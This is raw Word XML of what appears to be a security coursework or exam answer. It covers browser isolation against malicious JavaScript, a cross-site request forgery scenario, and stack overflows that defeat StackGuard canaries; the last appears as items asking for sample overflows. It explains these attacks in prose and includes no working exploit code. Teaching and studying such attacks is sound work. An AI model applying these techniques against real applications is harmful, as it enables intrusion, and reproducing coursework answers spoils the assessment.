          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b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owser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im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lem</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e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ta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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ion</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16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6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wo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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ld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il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wo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al </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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sepa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ate</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/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w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>se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w w:val="121"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d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t:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="47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Ma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>io</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="85"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>J</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ava</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="107"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="107"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="120"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="118"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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ew</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="51"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="118"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>abs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRDefault="00893EAE">
      <w:pPr>
        <w:spacing w:before="20" w:line="253" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="152"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="00621703" w:rsidRDefault="00893EAE">
      <w:pPr>
        <w:spacing w:before="20" w:line="253" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="152"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00893EAE" w:rsidRPr="00621703">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="880" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
        <w:t>A Cross-Site Request Forgery (CSRF)</w:t>
      </w:r>
      <w:r w:rsidR="007A6E5C" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> where the user is forced to execute an unwanted action on a web application in which he/she is currently authenticated</w:t>
      </w:r>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="007A6E5C" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> For this to occur the user would open a specially crafted URL on the insecure side containing malicious JavaScript, which opens a new tab to a secure site.</w:t>
      </w:r>
      <w:r w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007A6E5C" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">This would cause contamination in a single browser; however, in the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="007A6E5C" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>two browser</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="007A6E5C" w:rsidRPr="00621703">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> scenario even the new tab opened by the crafted URL would be open on the insecure browser even though it is a “secure” site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="59" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="10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20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4"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proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i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stack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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ov</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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low</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e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se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="11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milar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proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="21"/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guard</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/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wo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ks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s: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w w:val="121"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="107"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="107"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ion </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>begi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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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ma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k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y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et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d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ess</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="114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located</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-30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ck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ame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ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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w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stack.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/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f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u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ct</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n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1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abo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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t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5"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
          <w:w w:val="11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i.e.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j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st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="32"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/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efo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  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gramEnd"/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)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pr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r>
        <w:rPr>
          <w:spacing w:val="-8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cks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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>dr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9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w w:val="118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h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr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ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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w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stack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al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et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>dr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ess</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10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stack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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ame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d  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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mi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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">es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pr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r>
        <w:rPr>
          <w:spacing w:val="-5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n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ot.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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pacing w:val="-2"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ke </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>St</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:spacing w:val="1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kgu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d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/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add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  <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="21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c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2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d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112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17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co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>mp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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spacing w:val="-2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time.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w w:val="111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s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>me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ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w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tack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w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>located</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
          <w:w w:val="1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so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ix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l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="10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eap </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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kn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n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at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>acke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="18" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="151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 xml:space="preserve">a) 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ive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sam</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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le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  a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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ack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ov</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>fl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ow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3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defe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ts </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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kgua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proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/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i/>
          <w:spacing w:val="-3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ld</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ck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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ace.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="259" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="189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b)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ive</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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sam</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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le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ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44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ov</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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low</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
